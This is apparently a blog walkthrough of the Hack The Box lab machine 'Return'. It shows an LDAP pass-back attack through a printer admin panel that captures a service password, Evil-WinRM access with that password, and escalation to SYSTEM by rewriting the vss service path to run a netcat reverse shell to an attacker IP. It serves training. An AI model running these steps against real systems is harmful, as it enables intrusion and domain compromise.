---
layout: post
title: 'Return -Hack The Box Full Walkthrough'
date: 2026-04-16 16:12:21 +0000
categories: [cybersecurity]
tags:
  - writeup
description: "Room link: https://app.hackthebox.com/machines/Return"
canonical_url: "https://medium.com/@hemanthakrishnach/return-hack-the-box-full-walkthrough-faeb59da8833"
image: "/assets/images/posts/return-hack-the-box-full-walkthrough/img-000-85946292.png"
---

Room link: https://app.hackthebox.com/machines/Return

---

Room link: <https://app.hackthebox.com/machines/Return>![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-000-85946292.png)

### Introduction

In this walkthrough, we’ll be exploiting a Windows-based machine that exposes several Active Directory-related services. The goal is to enumerate the target, gain initial access, escalate privileges, and capture both user and root flags.

### 🔍 Reconnaissance

We begin with an Nmap scan to identify open ports and services:
```xml
nmap -sC -sV <MACHINE_IP>
```
![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-001-b678290e.png)

#### The scan reveals several interesting services:

- **Port 389 (LDAP):** Microsoft Windows Active Directory LDAP.- **Port 5985 (WinRM):** Suggests a potential entry point if we can find credentials.- **Port 80 (HTTP):** A web server is running the “HTB Printer Admin Panel”.

The hostname is identified as **PRINTER** within the **return.local** domain.

This strongly suggests:

- The machine is part of an **Active Directory domain**- LDAP and Kerberos will likely be useful for enumeration

### 🌐 Web Enumeration

Navigating to the web interface at `http://`<MACHINE\_IP>`/index.php` brings up a printer management console.![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-002-bfb09fa8.png)

Under the **Settings** tab, we find a configuration for an LDAP server.

- Server Address: `printer.return.local`- Port: `389` (LDAP)- Username: `svc-printer`

![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-003-27e26f3a.png)

This hints that:

- The application interacts with LDAP- Credentials may be exposed or injectable

### 🔑 Credential Discovery

Since the password field is obscured, we can perform an **LDAP Pass-back attack**. By changing the “Server Address” to our own local IP and listening on port 389, the printer will attempt to authenticate to us, revealing the password in plain text.

1. Start a Netcat listener on the attacker machine:- `nc -lvnp 389`- Update the printer settings to point to the attacker’s IP (e.g., `10.10.16.10`) and click "Update".

The listener captures the connection and the credentials:
> ***svc-printer : 1edFg43012!!***

![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-004-e66346b4.png)

### 💻 Initial Access

With valid credentials for `svc-printer`, we can attempt to log in via **Evil-WinRM**, as port 5985 was found open during enumeration.
```bash
evil-winrm -i <MACHINE_IP> -u svc-printer -p '1edFg43012!!'
```

Upon successful login, we land in `C:\Users\svc-printer\Documents`. Navigating to the Desktop, we can retrieve the first flag:
```bash
type C:\Users\svc-printer\Desktop\user.txt
```
![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-005-015d292b.png)

### ⬆️ Privilege Escalation

To escalate privileges, we first examine the groups associated with the `svc-printer` account:
```sql
net user svc-printer
```

The output shows that the user is a member of the **Server Operators** group. This is a highly privileged group that allows users to start, stop, and configure services.![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-006-bc5f0800.png)

We can exploit this by reconfiguring a service to execute a malicious payload. We’ll use the **Volume Shadow Copy (vss)** service.

- **Upload Netcat:** Upload a Windows version of `nc.exe` to the target. Download a copy from [here](https://github.com/int0x33/nc.exe/).

![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-007-a3ba619a.png)

- **Reconfigure the Service:** Change the binary path of the `vss` service to execute a reverse shell back to our machine: `sc.exe config vss binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <ATTACKER_IP> 4444"`

![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-008-97d9734f.png)

- **Stop and restart the Service:**

```vbnet
sc.exe stop vss
```

```sql
sc.exe start vss
```
![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-009-fb766b5b.png)

On our attacker machine, we catch the shell on port 4444. Running `whoami` confirms we are now **nt authority\system**.![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-010-d58ee3bd.png)

Now with SYSTEM privileges, we can navigate to the Administrator’s desktop to collect the final flag.
```bash
cd C:\Users\Administrator\Desktoptype root.txt
```

### ✅ Conclusion

This machine demonstrates a classic chain:

1. Service enumeration- Credential discovery via web panel- WinRM access- Privilege escalation via service abuse

A great example of how small misconfigurations can lead to full domain compromise.

Thanks for reading!
